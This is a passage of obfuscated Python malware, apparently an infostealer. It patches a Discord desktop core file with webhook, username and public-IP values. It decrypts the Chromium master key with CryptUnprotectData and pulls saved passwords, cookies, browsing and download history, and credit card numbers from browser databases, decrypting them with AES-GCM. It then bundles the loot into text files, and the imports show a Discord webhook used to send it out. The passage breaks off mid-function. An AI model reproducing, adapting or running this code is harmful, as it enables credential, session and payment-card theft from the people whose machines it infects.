                    f.write((XYQZYBXJZRCKODEXUIMYURNESZQSJTEQMPRROXSAXXBPEXPKOH).replace('discord_desktop_core-1', VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR_file)
                            .replace(r"%WEBHOOK_HERE%", AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP)
                            .replace(r"%EMBED_COLOR%", str(TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX))
                            .replace(r"%USERNAME%", IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG)
                            .replace(r"%IP_PUBLIC%", GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV)
                            .replace(r"%EMBED_NAME%", EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE)
                            .replace(r"%EMBED_ICON%", KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)
                            .replace(r"%FOOTER_TEXT%", WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV)
                            .replace(r"%WEBSITE%", KZAMWVVQJASNIJJBDUJJEXDGAGDDLRVPHQEWJYCNBAHIJLDPHB))
                GIZHBUNYHFEDSSWQTQDFNOORDGECKKEEQZSLNPDBDCFKDLBBWGVAVUOEJDCQLXNUWRLUSFGNRLUQTAQGJKKKEBPVCK(NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ)
    PUAFUFVYRXSUFWZEPTTLWORHJVSZTETRLKLTJHQWMSXEMOKQXDWRPQMJEPC()

def AUNKPANUTRTFVNNKHHGNLGCSCREXUGJKWUFROHVLXENTICPFKTXFKZCYAWOGURCFJUTMFLKWVVIXZUWCOFFJXWKDLHIYJWLT():
    import os
    import io
    import zipfile
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from discord import SyncWebhook, Embed, File
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    ZGRZHPSFENLKNYPVMARMIQSKKYAJPBWPDOJVDYHHEXGPEWZEXRVWBDDEMJMFZVJHFZALQDDVHTJDKIGFQVLEYBILMISAWUIMSBO = []
    MHYNYXQJCFPCSZBRXEZYIKCOLHNJCFYJTMYGEUAVIDPYDQJAVTSZXBCJJKFBBZPBLTMKXWKPDVEPEAMJKN = []
    HRJFIJLKDPGBYQMWSHUDNJXXTNKISJHGAGICFZVULMYDAYMRORL = []
    HYMMHGBLQAIJYEQNDNOJRJWURKPGXXXNGVMQBVOZWASBUWPOVKKUMQ = []
    BJRPTLTHZFLTOXSGSUGJKNCQVGLQCHNWVCCDOZBBVHFAFFCOKNPBZHEZXWCRGNHHXLZZADGBJXRYYCPNOQQMQEJXWMFNPPG = []
    ICXYVGXFJGZZQPVMGQIIGOGFCIGEPEXUMWLLUASTANKDJLFKZZHECSACXHUSPTQOEJCQMGLMVBMCHNUOPGEVXZIPOVAFJZIGAH = []

    def KRGGXTMYYEWIVYSQFRMUZLWXZTWNIWZOJBABDVMGGQDKKHGXNOT(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY):
        if not os.path.exists(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY):
            return None

        try:
            with open(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY, 'r', encoding='utf-8') as v4r_f:
                RSPROCEDDCOTFLDWYZVWVSUCKPXNBYOECEQHEKEUPVQCFBEKDCKTRHDCAHQMLSCSUXNKYIPKWXWKBQDSNCTBFDYAVJCC = json.load(v4r_f)

            HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ_key = base64.b64decode(RSPROCEDDCOTFLDWYZVWVSUCKPXNBYOECEQHEKEUPVQCFBEKDCKTRHDCAHQMLSCSUXNKYIPKWXWKBQDSNCTBFDYAVJCC["os_crypt"]["encrypted_key"])[5:]
            MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM = win32crypt.CryptUnprotectData(HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ_key, None, None, None, 0)[1]
            return MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM
        except:
            return None

    def KJDDJHCCCBQWIRELTVAVCRICZPFXMWVXISQNURNJXLTEWELNQIPYBY(LKOPMAQXXPZHALWFROBBIIYVSQQGLAWQZDWYIPGJOPXWFWFLPJQAMDABZODJCRLLNQIVH, MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM):
        try:
            AIJZLCNXVCBSTLRDDCKETBTHIWIXHLWZLZAJOVJINLZWDHJLDPATJTTDSSQCXZPYMYVSMRNBORUGMAILNZHVSXNDAJ = LKOPMAQXXPZHALWFROBBIIYVSQQGLAWQZDWYIPGJOPXWFWFLPJQAMDABZODJCRLLNQIVH[3:15]
            ZHLMTYNXTLBQMVMKNFMCYFSVYOEUSGVRMRGVBOZJVHKKJVZWXPTNVKCEGJTPGCHWTUAEZAIL = LKOPMAQXXPZHALWFROBBIIYVSQQGLAWQZDWYIPGJOPXWFWFLPJQAMDABZODJCRLLNQIVH[15:-16]
            QMPMRZEVPCTMSNOMGTRDFRQBRAXQXAZQGHNRUZNVYAWAWPVQOPP = LKOPMAQXXPZHALWFROBBIIYVSQQGLAWQZDWYIPGJOPXWFWFLPJQAMDABZODJCRLLNQIVH[-16:]
            BQQGOGEVKROCDNEXNFWEFQHQEIVQKDMTOVUSDKZKJDCMXSBCYXK = Cipher(algorithms.AES(MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM), modes.GCM(AIJZLCNXVCBSTLRDDCKETBTHIWIXHLWZLZAJOVJINLZWDHJLDPATJTTDSSQCXZPYMYVSMRNBORUGMAILNZHVSXNDAJ, QMPMRZEVPCTMSNOMGTRDFRQBRAXQXAZQGHNRUZNVYAWAWPVQOPP))
            OJUUWLNKNANCUGBFLPFFSDTLYGNSNDABFEERCATYWCCSJKNGDDBOEFEVWEZIQUQDNSGDDYAOCCGOXRTY = BQQGOGEVKROCDNEXNFWEFQHQEIVQKDMTOVUSDKZKJDCMXSBCYXK.decryptor()
            SSJYJAXBQRZLHDLCONHCKTGGMKGEUFNEVHTCZPOHRMWGYBHDBNFHUMPRPARSEVATJRDXSKHVJORHOATFYTAABQUWZQLVLJIJMU = OJUUWLNKNANCUGBFLPFFSDTLYGNSNDABFEERCATYWCCSJKNGDDBOEFEVWEZIQUQDNSGDDYAOCCGOXRTY.update(ZHLMTYNXTLBQMVMKNFMCYFSVYOEUSGVRMRGVBOZJVHKKJVZWXPTNVKCEGJTPGCHWTUAEZAIL) + OJUUWLNKNANCUGBFLPFFSDTLYGNSNDABFEERCATYWCCSJKNGDDBOEFEVWEZIQUQDNSGDDYAOCCGOXRTY.finalize()
            return SSJYJAXBQRZLHDLCONHCKTGGMKGEUFNEVHTCZPOHRMWGYBHDBNFHUMPRPARSEVATJRDXSKHVJORHOATFYTAABQUWZQLVLJIJMU.decode()
        except:
            return None
        
    def WZUVYEKGUBXNGFIDLLSRHZEVHZJPXQJCPDIVROUSJMPALPJOPBAXONMRZNEODKUQMCUHNDUYRGDGFQEULEEH(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM):
        OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG_db = os.path.join(JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, 'Login Data')
        if not os.path.exists(OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG_db):
            return

        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG_db)
        disk_conn.backup(XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA)
        disk_conn.close()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV = XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.cursor()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            RUKLGAXLQROTAORDEYHXYGPFXPFEFNQICGUIJAGJBWDPMBKZPZBBQNFGYODGYHBCYPAOIYUOK =          f"- Url      : {v4r_row[0]}"
            ZSQWYLIDXDFSKEKEGBJMFSKEPURWNHPKGYONPNVSAXIASHYNLGQXWOURUVZSSLTZBDFNBFBCFSLAZILTJRXYPJBEGM =     f"  Username : {v4r_row[1]}"
            OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG =     f"  Password : {KJDDJHCCCBQWIRELTVAVCRICZPFXMWVXISQNURNJXLTEWELNQIPYBY(v4r_row[2], MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM)}"
            WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name = f"  Browser  : {WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU}"
            ZGRZHPSFENLKNYPVMARMIQSKKYAJPBWPDOJVDYHHEXGPEWZEXRVWBDDEMJMFZVJHFZALQDDVHTJDKIGFQVLEYBILMISAWUIMSBO.append(f"{RUKLGAXLQROTAORDEYHXYGPFXPFEFNQICGUIJAGJBWDPMBKZPZBBQNFGYODGYHBCYPAOIYUOK}\n{ZSQWYLIDXDFSKEKEGBJMFSKEPURWNHPKGYONPNVSAXIASHYNLGQXWOURUVZSSLTZBDFNBFBCFSLAZILTJRXYPJBEGM}\n{OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG}\n{WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name}\n")

        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.close()

    def VDCEZBUFMFUPXITAULYGZAYJTMPMUSEBSYPMEAAJCMPYNZCQRFWWVUGFXOCYMPSWIRZHJSQPFKTTUBKVRF(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM):
        TDNUFAZAERHMCJXALTKSYANXXLUUNAZGTVBCCFEEDCEUOCWXYK = os.path.join(JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, 'Network', 'Cookies')
        if not os.path.exists(TDNUFAZAERHMCJXALTKSYANXXLUUNAZGTVBCCFEEDCEUOCWXYK):
            return

        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(TDNUFAZAERHMCJXALTKSYANXXLUUNAZGTVBCCFEEDCEUOCWXYK)
        disk_conn.backup(XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA)
        disk_conn.close()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV = XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.cursor()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            RUKLGAXLQROTAORDEYHXYGPFXPFEFNQICGUIJAGJBWDPMBKZPZBBQNFGYODGYHBCYPAOIYUOK =          f"- Url     : {v4r_row[0]}"
            TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB =         f"  Name    : {v4r_row[1]}"
            FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY =         f"  Path    : {v4r_row[2]}"
            RFRGCIWADILPHMEZWCEBVYPQVZYQQFVFERWTNHJTVPUIWKVOBSCACJAQMNHBSFAESAXVOYQEIVBITASDUYHSZBTRUWFHPQH =       f"  Cookie  : {KJDDJHCCCBQWIRELTVAVCRICZPFXMWVXISQNURNJXLTEWELNQIPYBY(v4r_row[3], MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM)}"
            HQCFRXMDRLYWGHRQTCDTXNKLITMUGGNKEIURVADQOPYDOWRAYDMIVIVHZNYSJZJRYDNPZEAWTOZEH =       f"  Expire  : {v4r_row[4]}"
            WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name = f"  Browser : {WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU}"
            MHYNYXQJCFPCSZBRXEZYIKCOLHNJCFYJTMYGEUAVIDPYDQJAVTSZXBCJJKFBBZPBLTMKXWKPDVEPEAMJKN.append(f"{RUKLGAXLQROTAORDEYHXYGPFXPFEFNQICGUIJAGJBWDPMBKZPZBBQNFGYODGYHBCYPAOIYUOK}\n{TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB}\n{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}\n{RFRGCIWADILPHMEZWCEBVYPQVZYQQFVFERWTNHJTVPUIWKVOBSCACJAQMNHBSFAESAXVOYQEIVBITASDUYHSZBTRUWFHPQH}\n{HQCFRXMDRLYWGHRQTCDTXNKLITMUGGNKEIURVADQOPYDOWRAYDMIVIVHZNYSJZJRYDNPZEAWTOZEH}\n{WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name}\n")

        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.close()

    def DEKRKHMPPPNNESCMCHTSSNOWOOHJQXPBUHQGGBAVOTOEWUCPZCKEJKBWRLXDRGARGTIPJBSZBXRIOFLGSZCFEUTPRRPKPCSM(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH):
        KPQIPCOPPNPQWUENZHJLAEGDWLTGWKSDUSSXNRTNOFDQQQTYABVEM = os.path.join(JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, 'History')
        if not os.path.exists(KPQIPCOPPNPQWUENZHJLAEGDWLTGWKSDUSSXNRTNOFDQQQTYABVEM):
            return
        
        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(KPQIPCOPPNPQWUENZHJLAEGDWLTGWKSDUSSXNRTNOFDQQQTYABVEM)
        disk_conn.backup(XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA)
        disk_conn.close()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV = XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.cursor()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            RUKLGAXLQROTAORDEYHXYGPFXPFEFNQICGUIJAGJBWDPMBKZPZBBQNFGYODGYHBCYPAOIYUOK =          f"- Url     : {v4r_row[0]}"
            GISCARLJBAXMCSKGZQPAGPZPWUNDAQUJPZXSJFXSSEGFMHKSZGDDYSQTOBPKKFPSJYWGNXRBPRORDG =        f"  Title   : {v4r_row[1]}"
            OJIXDQEWBETCVXVRXHNUBHQVGCJNSKRFGDZUTCIOEUVGWFNJWSLXEXOBGJCNZRMAXVOREWCTUTYANUZCQCHDPWP =         f"  Time    : {v4r_row[2]}"
            WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name = f"  Browser : {WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU}"
            HRJFIJLKDPGBYQMWSHUDNJXXTNKISJHGAGICFZVULMYDAYMRORL.append(f"{RUKLGAXLQROTAORDEYHXYGPFXPFEFNQICGUIJAGJBWDPMBKZPZBBQNFGYODGYHBCYPAOIYUOK}\n{GISCARLJBAXMCSKGZQPAGPZPWUNDAQUJPZXSJFXSSEGFMHKSZGDDYSQTOBPKKFPSJYWGNXRBPRORDG}\n{OJIXDQEWBETCVXVRXHNUBHQVGCJNSKRFGDZUTCIOEUVGWFNJWSLXEXOBGJCNZRMAXVOREWCTUTYANUZCQCHDPWP}\n{WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name}\n")

        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.close()

    def ZUJCDTYTLABAPBXRQATQOEPVJMEPPQTFMYOLPUJASZYTDWWDAMYGKELTEFCBQZMBYRBVMUNJBLU(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH):
        IPHONPKAYLPWIGXSODSNECWEOPLDRUSBQLLGQTGVESRDZKJCJEHYXYFOTSRNULMJFQYAEMZHAGPKRZQRWDHAMLVPE = os.path.join(JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, 'History')
        if not os.path.exists(IPHONPKAYLPWIGXSODSNECWEOPLDRUSBQLLGQTGVESRDZKJCJEHYXYFOTSRNULMJFQYAEMZHAGPKRZQRWDHAMLVPE):
            return

        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(IPHONPKAYLPWIGXSODSNECWEOPLDRUSBQLLGQTGVESRDZKJCJEHYXYFOTSRNULMJFQYAEMZHAGPKRZQRWDHAMLVPE)
        disk_conn.backup(XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA)
        disk_conn.close()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV = XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.cursor()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.execute('SELECT tab_url, target_path FROM downloads')
        for row in GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.fetchall():
            if not row[0] or not row[1]:
                continue
            FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY =         f"- Path    : {row[1]}"
            RUKLGAXLQROTAORDEYHXYGPFXPFEFNQICGUIJAGJBWDPMBKZPZBBQNFGYODGYHBCYPAOIYUOK =          f"  Url     : {row[0]}"
            WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name = f"  Browser : {WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU}"
            HYMMHGBLQAIJYEQNDNOJRJWURKPGXXXNGVMQBVOZWASBUWPOVKKUMQ.append(f"{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}\n{RUKLGAXLQROTAORDEYHXYGPFXPFEFNQICGUIJAGJBWDPMBKZPZBBQNFGYODGYHBCYPAOIYUOK}\n{WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name}\n")

        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.close()

    def LNCMNUWEKUUVFUXSYSJLAFZGDJPGCQNPTCRDMTEAPKPLICIIKBFQWL(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM):
        CZQINQCORNBBCMNCDTCOHPEEHNIIDUGNAZPKJHBWQIRFYOWISPSTIWRPNJGACWVXKHNAQVACHEALGWGDPIEIKNZTVLKRKB = os.path.join(JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, 'Web Data')
        if not os.path.exists(CZQINQCORNBBCMNCDTCOHPEEHNIIDUGNAZPKJHBWQIRFYOWISPSTIWRPNJGACWVXKHNAQVACHEALGWGDPIEIKNZTVLKRKB):
            return

        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(CZQINQCORNBBCMNCDTCOHPEEHNIIDUGNAZPKJHBWQIRFYOWISPSTIWRPNJGACWVXKHNAQVACHEALGWGDPIEIKNZTVLKRKB)
        disk_conn.backup(XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA)
        disk_conn.close()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV = XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.cursor()
        GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in GVXFTVRAUXAVZZDBIJOQLGZTFLKQHSLOMVOYQMGUHHEHRYHRRKNAOSEJAPLKGPROGJSYEV.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB =             f"- Name             : {v4r_row[0]}"
            UVTBPKKMNXPXWRGRPYRYCJHGKSAFIGQXSFECIZAGGLDTSECQSUPMPJXECN = f"  Expiration Month : {v4r_row[1]}"
            WFHIKOMEGLDCRFTMZWMWHSDLISYFTSNASBHAWJKRCSRRMRAORJWEBTZZDSQAQVOZGK =  f"  Expiration Year  : {v4r_row[2]}"
            PWYWISATXGWTLKRZLCIIBCRLEYRCVURUBDMSFTFXPNJQXDHROHZOB =      f"  Card Number      : {KJDDJHCCCBQWIRELTVAVCRICZPFXMWVXISQNURNJXLTEWELNQIPYBY(v4r_row[3], MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM)}"
            JPOIGYHRCBIOFZYIGEXGQHAUOUBVKJRGNWRDHIMYJEYERPAYOUHKNMGSXGKASNONSUZVOQSKKKZBHTGX =    f"  Date Modified    : {v4r_row[4]}"
            WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name =     f"  Browser          : {WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU}"
            BJRPTLTHZFLTOXSGSUGJKNCQVGLQCHNWVCCDOZBBVHFAFFCOKNPBZHEZXWCRGNHHXLZZADGBJXRYYCPNOQQMQEJXWMFNPPG.append(f"{TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB}\n{UVTBPKKMNXPXWRGRPYRYCJHGKSAFIGQXSFECIZAGGLDTSECQSUPMPJXECN}\n{WFHIKOMEGLDCRFTMZWMWHSDLISYFTSNASBHAWJKRCSRRMRAORJWEBTZZDSQAQVOZGK}\n{PWYWISATXGWTLKRZLCIIBCRLEYRCVURUBDMSFTFXPNJQXDHROHZOB}\n{JPOIGYHRCBIOFZYIGEXGQHAUOUBVKJRGNWRDHIMYJEYERPAYOUHKNMGSXGKASNONSUZVOQSKKKZBHTGX}\n{WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU_name}\n")
        
        XLQNPQBKHRLYMGNYCSCODXGADSXRRPOLUSLKLDQWCRAEKBOJVKARYA.close()

    def SEGDFMCOTSEMQEPNAGSUGISZMRYTGSKFMBFKQCSRFFUSGDYUNJDTBXHBZQYTLCEEBJJRYAPSWKHEDVVIFXHEGUQTS(IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG):
        files_in_memory = {}

        if ZGRZHPSFENLKNYPVMARMIQSKKYAJPBWPDOJVDYHHEXGPEWZEXRVWBDDEMJMFZVJHFZALQDDVHTJDKIGFQVLEYBILMISAWUIMSBO:
            files_in_memory[f"Passwords_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt"] = '\n'.join(ZGRZHPSFENLKNYPVMARMIQSKKYAJPBWPDOJVDYHHEXGPEWZEXRVWBDDEMJMFZVJHFZALQDDVHTJDKIGFQVLEYBILMISAWUIMSBO)

        if MHYNYXQJCFPCSZBRXEZYIKCOLHNJCFYJTMYGEUAVIDPYDQJAVTSZXBCJJKFBBZPBLTMKXWKPDVEPEAMJKN:
            files_in_memory[f"Cookies_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt"] = '\n'.join(MHYNYXQJCFPCSZBRXEZYIKCOLHNJCFYJTMYGEUAVIDPYDQJAVTSZXBCJJKFBBZPBLTMKXWKPDVEPEAMJKN)

        if HRJFIJLKDPGBYQMWSHUDNJXXTNKISJHGAGICFZVULMYDAYMRORL:
            files_in_memory[f"History_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt"] = '\n'.join(HRJFIJLKDPGBYQMWSHUDNJXXTNKISJHGAGICFZVULMYDAYMRORL)

        if HYMMHGBLQAIJYEQNDNOJRJWURKPGXXXNGVMQBVOZWASBUWPOVKKUMQ:
